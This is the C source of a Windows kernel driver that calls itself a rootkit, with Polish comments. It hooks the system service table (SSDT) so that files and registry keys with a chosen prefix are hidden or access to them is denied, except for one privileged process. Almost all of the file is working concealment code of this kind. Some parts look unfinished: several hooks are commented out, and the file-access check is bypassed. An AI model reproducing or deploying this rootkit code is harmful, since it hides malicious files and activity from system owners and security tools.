#include <ntddk.h>
#include "rk_hook.h"
#include "rk_DKOM.h"
#include "rootkit.h"
#include "rk_Tools.h"


extern API_INDEXES    currentAPI;
extern NTOSKRNL_OFFSETS	offsets;
extern UNICODE_STRING hidePrefixW;
extern char *hidePrefixA;
extern char *rulingProcess;

NTQUERYDIRECTORYFILE		OldNtQueryDirectoryFile = NULL;
NTCREATEFILE				OldNtCreateFile;
ZWOPENKEY                   OldZwOpenKey;
ZWENUMERATEKEY              OldNtEnumerateKey;
ZWQUERYKEY                  OldNtQueryKey;

BOOLEAN bHooked = FALSE;

/*
* Zalozenie hookow na okreslone funkcje w tablicy SSDT.
* Przechwytujemy wywolania funkcji (us³ug systemowych):
* - NtCreateFile 
* - NtQueryDirectoryFile                   
* - NtOpenKey
*/
VOID HookApis()
{
	KIRQL irql;

	if (!bHooked)
	{
		irql = RaiseIRQLevel();

		WPOFF();
		DbgPrint("rootkit: Hookowanie tablicy SSDT\n");
		// NtCreateFile
		OldNtCreateFile	= SYSCALL( currentAPI.NtCreateFileIndex );
		SYSCALL( currentAPI.NtCreateFileIndex ) = HookNtCreateFile;

		// NtQueryDirectoryFile
		OldNtQueryDirectoryFile	= SYSCALL( currentAPI.NtQueryDirectoryFileIndex );
		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;

//        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
//        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 

//        OldNtQueryKey= SYSTEMSERVICE(ZwQueryKey);
//        SYSTEMSERVICE( ZwQueryKey ) = HookNtQueryKey; 

//        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
//        __asm int 3
//        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 

		bHooked = TRUE;
		WPON();

		LowerIRQLevel( irql );
    }
}

/*
*   Zdjecie hookow z tablicy SSDT.
*/
VOID UnHookApis()
{
	KIRQL irql;

	if (bHooked)
	{
 
		irql = RaiseIRQLevel();

		WPOFF();

		SYSCALL( currentAPI.NtCreateFileIndex ) = OldNtCreateFile;	
		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = OldNtQueryDirectoryFile;	
		
//        SYSTEMSERVICE( ZwOpenKey ) = OldZwOpenKey;
//        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;
//        SYSTEMSERVICE( ZwQueryKey ) = OldNtQueryKey;         

		bHooked = FALSE;
		WPON();

		LowerIRQLevel( irql );
	}
}

NTSTATUS HookNtQueryKey(
	HANDLE hKey,
	KEY_INFORMATION_CLASS KeyInfoClass,
	PVOID KeyInfoBuffer,
	ULONG KeyInfoBufferLength,
	PULONG Byte
)
{
  NTSTATUS rc;
  rc = OldNtQueryKey( hKey,
                      KeyInfoClass,
                      KeyInfoBuffer,
                      KeyInfoBufferLength,                    
                      Byte);

//  __asm int 3 


  if (STATUS_SUCCESS != rc) {
     DbgPrint("error=>leaving\n");
     return rc;
  }
  
  DbgPrint("Entered HookNtQueryKey=%ld\n",KeyInfoClass);  

  if (KeyInfoClass==KeyFullInformation) {
//     DbgPrint("KeyFullInformation\n");
     if (KeyInfoBufferLength == sizeof(KEY_FULL_INFORMATION))
        DbgPrint("KeyFullInformation> COUNT=%ld/%ld\n",((KEY_FULL_INFORMATION*)KeyInfoClass)->SubKeys,((KEY_FULL_INFORMATION*)KeyInfoClass)->Values);
  }
  else
  if (KeyInfoClass==KeyNameInformation) {
//     DbgPrint("KeyNameInformation\n");  
     if (KeyInfoBufferLength == sizeof(KEY_NAME_INFORMATION) )                                          
        DbgPrint("KeyNameInformation> NAME=%S\n",((KEY_NAME_INFORMATION*)KeyInfoClass)->Name);                                        
  }
  else
  if (KeyInfoClass==KeyCachedInformation) {                                          
//     DbgPrint("KeyCachedInformation\n");                                          
     if (KeyInfoBufferLength == sizeof(KEY_CACHED_INFORMATION) ) {                                              
       DbgPrint("KeyCachedInformation> COUNT=%ld/%ld\n",((KEY_CACHED_INFORMATION*)KeyInfoClass)->SubKeys,((KEY_CACHED_INFORMATION*)KeyInfoClass)->Values);
       DbgPrint("KeyCachedInformation> NAME=%S\n",((KEY_CACHED_INFORMATION*)KeyInfoClass)->Name);
     }     
  }
  else
  if (KeyInfoClass==KeyBasicInformation) {
//     DbgPrint("KeyBasicInformation\n");
     if (KeyInfoBufferLength == sizeof(KEY_BASIC_INFORMATION) )                                   
        DbgPrint("KeyBasicInformation> NAME=%S\n",((KEY_BASIC_INFORMATION*)KeyInfoClass)->Name);                                        
  }
  else
  {    
     DbgPrint("Otherclass=%ld\n",KeyInfoClass);
  }

  DbgPrint("TEST\n");
  
  return rc;
}

NTSTATUS 
  HookNtEnumerateKey(
    IN HANDLE  KeyHandle,
    IN ULONG  Index,
    IN KEY_INFORMATION_CLASS  KeyInformationClass,
    OUT PVOID  KeyInformation,
    IN ULONG  Length,
    OUT PULONG  ResultLength
    )
{
  NTSTATUS rc;
  WCHAR *key = NULL;
  ULONG keyLen = 0;
  PVOID Object;
  char KeyName[1024];
  rc=ObReferenceObjectByHandle( KeyHandle, 0, 0, KernelMode, &Object, NULL);
  if (rc==STATUS_SUCCESS) {
     int BytesReturned;
     rc=ObQueryNameString( Object,
                           (PUNICODE_STRING)KeyName,
                           1024,
                           &BytesReturned);
                           
     ObDereferenceObject(Object);
     DbgPrint("KeyName = %S\n",KeyName);
  }    
  
  rc = OldNtEnumerateKey(
       KeyHandle,
       Index,
       KeyInformationClass,
       KeyInformation,
       Length,
       ResultLength
       );

  key = ((KEY_BASIC_INFORMATION *)KeyInformation)->Name;
  keyLen = ((KEY_BASIC_INFORMATION *)KeyInformation)->NameLength;
  DbgPrint( "Key = %S (%ld)\n", key, keyLen );
  
//  (PVOID)&hidePrefixW.Buffer[ 0 ]
    
  if (keyLen >= hidePrefixW.Length ) 
     if (RtlCompareMemory( key, (PVOID)&hidePrefixW.Buffer[0] , hidePrefixW.Length) == hidePrefixW.Length ) 
//     if( !wcsncmp( key,
//		           (const wchar_t*)&hidePrefixW.Buffer[0],
//				   wcslen( hidePrefixW ) )
     {
           DbgPrint("Detected rootkit string!\n");

           wcsncpy( key, (const wchar_t*) "Windows Spoofed key name", keyLen );           
//           rc = OldNtEnumerateKey(
//                KeyHandle,
//                Index-1,
//                KeyInformationClass,
//                KeyInformation,
//                Length,
//                ResultLength
//                );
           return rc;
     }

//  DbgPrint("ZwEnumerateKey\n");    
     
  return rc;   
}

NTSTATUS 
HookZwOpenKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
    )
{
        int rc;
        WCHAR buf[1024]; 
        PEPROCESS currentEprocess = NULL;        
        
//        DbgPrint("Entered HookZwOpenKey\n");
        rc=((ZWOPENKEY)(OldZwOpenKey)) (
			phKey,
			DesiredAccess,
			ObjectAttributes );

	    //sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
        currentEprocess = PsGetCurrentProcess();
        if (IsPriviligedProcess( currentEprocess ) ) {
	       return rc;
        }
			
        if (ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) { 
           DbgPrint( "objectName =  %S\n",ObjectAttributes->ObjectName->Buffer );
           if (ObjectAttributes->ObjectName->Length >= wcslen(hidePrefixW.Buffer ) ) 
              if (wcsstr(ObjectAttributes->ObjectName->Buffer,hidePrefixW.Buffer) != NULL) {
//              if (RtlCompareMemory( ObjectAttributes->ObjectName->Buffer, hidePrefixW.Buffer, wcslen(hidePrefixW.Buffer )) == wcslen(hidePrefixW.Buffer) )  {
//                 DbgPrint( "objectName =  %S\n",ObjectAttributes->ObjectName->Buffer );
                 return STATUS_ACCESS_DENIED;              
              }
        }
		
//        getFullPath( buf, sizeof(buf), ObjectAttributes);
//        DbgPrint("KEY: %S\n",buf);
		
//		DbgPrint("rootkit: ZwOpenKey : rc = %x, phKey = %X\n", rc, *phKey);
      
        return rc;
}

//--------------------------------------------------------------------------


NTSTATUS HookNtQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
)
{
	NTSTATUS rc;
	PCHAR processName = NULL;
	PEPROCESS currentEprocess = NULL;	
	
	rc=OldNtQueryDirectoryFile(
			hFile,							/* this is the directory handle */
			hEvent,
			IoApcRoutine,
			IoApcContext,
			pIoStatusBlock,
			FileInformationBuffer,
			FileInformationBufferLength,
			FileInfoClass,
			bReturnOnlyOneEntry,
			PathMask,
			bRestartQuery);

	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
	currentEprocess = PsGetCurrentProcess();
	if (IsPriviligedProcess( currentEprocess ) ) {
		return rc;
	}

	if( NT_SUCCESS( rc ) && 
		(FileInfoClass == FileDirectoryInformation ||
		 FileInfoClass == FileFullDirectoryInformation ||
		 FileInfoClass == FileIdFullDirectoryInformation ||
		 FileInfoClass == FileBothDirectoryInformation ||
		 FileInfoClass == FileIdBothDirectoryInformation ||
		 FileInfoClass == FileNamesInformation )
		) 
	{
			PVOID p = FileInformationBuffer;
			PVOID pLast = NULL;
			BOOLEAN bLastOne;
			do 
			{
				bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
				
				// compare directory-name prefix with '_root_' to decide if to hide or not.

				if (getDirEntryFileLength(p,FileInfoClass) >= 8) {
					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 8 ) == 8 ) 
					{
                        DbgPrint("rootkit: Chowam plik\n");
						if( bLastOne ) 
						{
							if( p == FileInformationBuffer ) rc = 0x80000006;
							else setDirEntryLenToNext(pLast,FileInfoClass, 0);
							break;
						} 
						else 
						{
							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
							int iLeft = (ULONG)FileInformationBufferLength - iPos - getDirEntryLenToNext(p,FileInfoClass);
							RtlCopyMemory( p, (PVOID)( (char *)p + getDirEntryLenToNext(p,FileInfoClass) ), (ULONG)iLeft );
							continue;
						}
					}
				}
				pLast = p;
				p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
			} while( !bLastOne );
	}
	return rc;
}

NTSTATUS HookNtCreateFile(
  PHANDLE FileHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK IoStatusBlock,
  PLARGE_INTEGER AllocationSize,
  ULONG FileAttributes,
  ULONG ShareAccess,
  ULONG CreateDisposition,
  ULONG CreateOptions,
  PVOID EaBuffer,
  ULONG EaLength
)
{

	PEPROCESS currentEprocess = NULL;

	goto pass_throught;

	currentEprocess = PsGetCurrentProcess();
	if (IsPriviligedProcess( currentEprocess ) ) {
		goto pass_throught;
	}

	if (  wcslen(hidePrefixW.Buffer ) <= ObjectAttributes->ObjectName->Length )
		if (RtlCompareMemory( ObjectAttributes->ObjectName->Buffer, hidePrefixW.Buffer, wcslen(hidePrefixW.Buffer )) ) 
//		if (wcsstr(ObjectAttributes->ObjectName->Buffer, hidePrefixW ))
		{	
			return STATUS_ACCESS_DENIED;
		}

pass_throught:

	return OldNtCreateFile(
					FileHandle,
					DesiredAccess,
					ObjectAttributes,
					IoStatusBlock,
					AllocationSize,
					FileAttributes,
					ShareAccess,
					CreateDisposition,
					CreateOptions,
					EaBuffer,
					EaLength);
}


BOOLEAN IsPriviligedProcess( PEPROCESS eproc ) 
{
	ULONG len = 0;
	PCHAR processName = NULL;
	if ( eproc ) {
		processName = (PCHAR) ( (ULONG)eproc + offsets.processName );
		if (processName) {
			len = strlen(rulingProcess);
			if ( RtlCompareMemory( processName, rulingProcess, len ) == len )
				return TRUE;
		}
	}
	return FALSE;
}

